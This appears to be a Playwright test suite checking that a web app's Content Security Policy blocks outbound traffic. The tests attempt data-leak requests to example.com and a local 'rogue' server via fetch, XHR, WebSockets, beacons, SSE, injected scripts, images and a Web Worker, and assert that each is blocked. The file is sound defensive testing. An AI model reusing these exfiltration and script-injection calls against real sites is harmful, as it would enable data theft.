import { test, expect } from '@playwright/test';
import http from 'http';

test.describe('Adversarial CSP & Air-Gapped Network Stress Tests', () => {
  let rogueServer: http.Server;
  let rogueHits: string[] = [];
  let roguePort = 0;

  let failedRequests: { url: string; errorText?: string }[] = [];
  let responseRequests: string[] = [];

  test.beforeAll(async () => {
    await new Promise<void>((resolve, reject) => {
      rogueServer = http.createServer((req, res) => {
        rogueHits.push(`${req.method} ${req.url}`);
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('rogue-response');
      });
      rogueServer.on('error', reject);
      rogueServer.listen(0, '127.0.0.1', () => {
        const addr = rogueServer.address();
        if (addr && typeof addr === 'object') {
          roguePort = addr.port;
        }
        resolve();
      });
    });
  });

  test.afterAll(async () => {
    await new Promise<void>((resolve) => {
      if (rogueServer) {
        rogueServer.closeAllConnections?.();
        rogueServer.close(() => resolve());
      } else {
        resolve();
      }
    });
  });

  test.beforeEach(async ({ page }) => {
    rogueHits = [];
    failedRequests = [];
    responseRequests = [];

    page.on('requestfailed', (request) => {
      try {
        const url = new URL(request.url());
        // Only track requests not belonging to the app preview server (port 4173)
        if (url.port !== '4173') {
          failedRequests.push({ url: request.url(), errorText: request.failure()?.errorText });
        }
      } catch {
        // Ignore malformed or internal URLs
      }
    });

    page.on('response', (response) => {
      try {
        const url = new URL(response.url());
        if (url.port !== '4173') {
          responseRequests.push(response.url());
        }
      } catch {
        // Ignore malformed or internal URLs
      }
    });

    await page.goto('/');
    await page.waitForLoadState('domcontentloaded');
  });

  test.afterEach(async () => {
    // Invariant 1: Rogue network listener must NEVER receive any inbound connection or request
    expect(rogueHits).toEqual([]);
    // Invariant 2: Page must NEVER receive an unauthorized HTTP response
    expect(responseRequests).toEqual([]);
    // Invariant 3: Any requests aborted at network layer must be marked 'csp'
    for (const f of failedRequests) {
      expect([
        'csp',
        'net::ERR_BLOCKED_BY_CLIENT',
        'NS_ERROR_CONTENT_BLOCKED',
        'net::ERR_ABORTED',
        'NS_BINDING_ABORTED',
      ]).toContain(f.errorText);
    }
  });

  test('ADV-CSP-01: fetch() to external domain and rogue server is hard-blocked by CSP', async ({ page }) => {
    const result = await page.evaluate(async (port) => {
      const outcomes: { target: string; success: boolean; errorName?: string; errorMessage?: string }[] = [];

      for (const target of ['https://example.com/api/test', `http://127.0.0.1:${port}/leak`]) {
        try {
          await fetch(target, { method: 'POST', body: 'exfiltration' });
          outcomes.push({ target, success: true });
        } catch (err: unknown) {
          const error = err as Error;
          outcomes.push({
            target,
            success: false,
            errorName: error.name,
            errorMessage: error.message,
          });
        }
      }

      return outcomes;
    }, roguePort);

    expect(result).toHaveLength(2);
    for (const outcome of result) {
      expect(outcome.success).toBe(false);
      expect(outcome.errorName).toBe('TypeError');
      expect(outcome.errorMessage?.toLowerCase()).toMatch(/failed to fetch|networkerror/);
    }
  });

  test('ADV-CSP-02: XMLHttpRequest to external domain and rogue server is hard-blocked by CSP', async ({ page }) => {
    const result = await page.evaluate(async (port) => {
      const outcomes: { target: string; status: string; errorName?: string; errorMessage?: string }[] = [];

      for (const target of ['https://example.com/xhr-leak', `http://127.0.0.1:${port}/xhr-leak`]) {
        const res = await new Promise<{ target: string; status: string; errorName?: string; errorMessage?: string }>(
          (resolve) => {
            try {
              const xhr = new XMLHttpRequest();
              xhr.open('POST', target);
              xhr.onload = () => resolve({ target, status: `loaded-${xhr.status}` });
              xhr.onerror = () => resolve({ target, status: 'network-error' });
              xhr.send('payload=leak');
            } catch (err: unknown) {
              const error = err as Error;
              resolve({ target, status: 'thrown', errorName: error.name, errorMessage: error.message });
            }
          }
        );
        outcomes.push(res);
      }

      return outcomes;
    }, roguePort);

    expect(result).toHaveLength(2);
    for (const outcome of result) {
      expect(['network-error', 'thrown']).toContain(outcome.status);
    }
  });

  test('ADV-CSP-03: WebSocket connection to external host and rogue server is hard-blocked by CSP', async ({ page }) => {
    const result = await page.evaluate(async (port) => {
      const outcomes: { target: string; status: string; errorName?: string; errorMessage?: string }[] = [];

      for (const target of ['wss://echo.websocket.org', `ws://127.0.0.1:${port}/ws`]) {
        const res = await new Promise<{ target: string; status: string; errorName?: string; errorMessage?: string }>(
          (resolve) => {
            try {
              const ws = new WebSocket(target);
              ws.onopen = () => {
                ws.close();
                resolve({ target, status: 'opened' });
              };
              ws.onerror = () => resolve({ target, status: 'ws-error' });
            } catch (err: unknown) {
              const error = err as Error;
              resolve({ target, status: 'thrown', errorName: error.name, errorMessage: error.message });
            }
          }
        );
        outcomes.push(res);
      }

      return outcomes;
    }, roguePort);

    expect(result).toHaveLength(2);
    for (const outcome of result) {
      expect(['ws-error', 'thrown']).toContain(outcome.status);
    }
  });

  test('ADV-CSP-04: navigator.sendBeacon to external URL and rogue server is rejected by CSP', async ({ page }) => {
    const result = await page.evaluate((port) => {
      const outcomes: { target: string; status: string; errorName?: string }[] = [];

      for (const target of ['https://example.com/beacon', `http://127.0.0.1:${port}/beacon`]) {
        try {
          const queued = navigator.sendBeacon(target, 'beacon-payload');
          outcomes.push({ target, status: queued ? 'queued' : 'rejected' });
        } catch (err: unknown) {
          const error = err as Error;
          outcomes.push({ target, status: 'thrown', errorName: error.name });
        }
      }

      return outcomes;
    }, roguePort);

    expect(result).toHaveLength(2);
    for (const outcome of result) {
      // Chromium queues beacon in agent buffer before CSP kills it; Firefox rejects synchronously
      expect(['queued', 'rejected', 'thrown']).toContain(outcome.status);
    }
  });

  test('ADV-CSP-05: Injected external script elements are blocked by script-src', async ({ page }) => {
    const result = await page.evaluate(async (port) => {
      const outcomes: { target: string; loaded: boolean; status: string }[] = [];

      for (const target of ['https://cdn.example.com/injected.js', `http://127.0.0.1:${port}/injected.js`]) {
        const res = await new Promise<{ target: string; loaded: boolean; status: string }>((resolve) => {
          const script = document.createElement('script');
          script.src = target;
          script.onload = () => resolve({ target, loaded: true, status: 'loaded' });
          script.onerror = () => resolve({ target, loaded: false, status: 'blocked-error' });
          document.head.appendChild(script);
        });
        outcomes.push(res);
      }

      return outcomes;
    }, roguePort);

    expect(result).toHaveLength(2);
    for (const outcome of result) {
      expect(outcome.loaded).toBe(false);
      expect(outcome.status).toBe('blocked-error');
    }
  });

  test('ADV-CSP-06: Injected external images are blocked by img-src', async ({ page }) => {
    const result = await page.evaluate(async (port) => {
      const outcomes: { target: string; loaded: boolean; status: string }[] = [];

      for (const target of ['https://example.com/pixel.png?leak=true', `http://127.0.0.1:${port}/pixel.png`]) {
        const res = await new Promise<{ target: string; loaded: boolean; status: string }>((resolve) => {
          const img = new Image();
          img.src = target;
          img.onload = () => resolve({ target, loaded: true, status: 'loaded' });
          img.onerror = () => resolve({ target, loaded: false, status: 'blocked-error' });
        });
        outcomes.push(res);
      }

      return outcomes;
    }, roguePort);

    expect(result).toHaveLength(2);
    for (const outcome of result) {
      expect(outcome.loaded).toBe(false);
      expect(outcome.status).toBe('blocked-error');
    }
  });

  test('ADV-CSP-07: EventSource (Server-Sent Events) to unauthorized URL is blocked', async ({ page }) => {
    const result = await page.evaluate(async (port) => {
      const outcomes: { target: string; status: string }[] = [];

      for (const target of ['https://example.com/sse', `http://127.0.0.1:${port}/sse`]) {
        const res = await new Promise<{ target: string; status: string }>((resolve) => {
          try {
            const es = new EventSource(target);
            es.onopen = () => {
              es.close();
              resolve({ target, status: 'opened' });
            };
            es.onerror = () => {
              es.close();
              resolve({ target, status: 'sse-error' });
            };
          } catch {
            resolve({ target, status: 'thrown' });
          }
        });
        outcomes.push(res);
      }

      return outcomes;
    }, roguePort);

    expect(result).toHaveLength(2);
    for (const outcome of result) {
      expect(['sse-error', 'thrown']).toContain(outcome.status);
    }
  });

  test('ADV-CSP-08: Web Worker attempting outbound fetch is blocked by CSP', async ({ page }) => {
    const result = await page.evaluate(async (port) => {
      return new Promise<{ status: string; detail?: string }>((resolve) => {
        try {
          const workerCode = `
            self.onmessage = async () => {
              try {
                await fetch('http://127.0.0.1:${port}/worker-leak');
                self.postMessage({ status: 'worker-fetch-success' });
              } catch (err) {
                self.postMessage({ status: 'worker-fetch-blocked', message: err.message });
              }
            };
          `;
          const blob = new Blob([workerCode], { type: 'application/javascript' });
          const workerUrl = URL.createObjectURL(blob);
          const worker = new Worker(workerUrl);

          worker.onmessage = (e) => {
            worker.terminate();
            URL.revokeObjectURL(workerUrl);
            resolve(e.data);
          };

          worker.onerror = (e) => {
            worker.terminate();
            URL.revokeObjectURL(workerUrl);
            resolve({ status: 'worker-instantiation-blocked', detail: e.message });
          };

          worker.postMessage('ping');
        } catch (err: unknown) {
          const error = err as Error;
          resolve({ status: 'worker-blob-forbidden', detail: error.message });
        }
      });
    }, roguePort);

    expect(['worker-fetch-blocked', 'worker-instantiation-blocked', 'worker-blob-forbidden']).toContain(result.status);
  });

  test('ADV-CSP-09: Direct inspection of securitypolicyviolation events during attacks', async ({ page }) => {
    const violationSummary = await page.evaluate(async (port) => {
      const violations: { directive: string; blockedURI: string }[] = [];
      const handler = (e: SecurityPolicyViolationEvent) => {
        violations.push({
          directive: e.effectiveDirective || e.violatedDirective,
          blockedURI: e.blockedURI,
        });
      };

      window.addEventListener('securitypolicyviolation', handler);

      // Trigger prohibited fetch and script injection
      try {
        await fetch(`http://127.0.0.1:${port}/probe`);
      } catch {
        // Expected to fail under connect-src 'none'
      }

      try {
        const s = document.createElement('script');
        s.src = `http://127.0.0.1:${port}/probe.js`;
        document.head.appendChild(s);
      } catch {
        // Expected to fail under script-src 'self'
      }

      await new Promise((r) => setTimeout(r, 500));
      window.removeEventListener('securitypolicyviolation', handler);

      return violations;
    }, roguePort);

    expect(violationSummary.length).toBeGreaterThan(0);
    const directives = violationSummary.map((v) => v.directive);
    const hasConnectViolation = directives.some((d) => d.includes('connect-src') || d.includes('default-src'));
    expect(hasConnectViolation).toBe(true);
  });
});
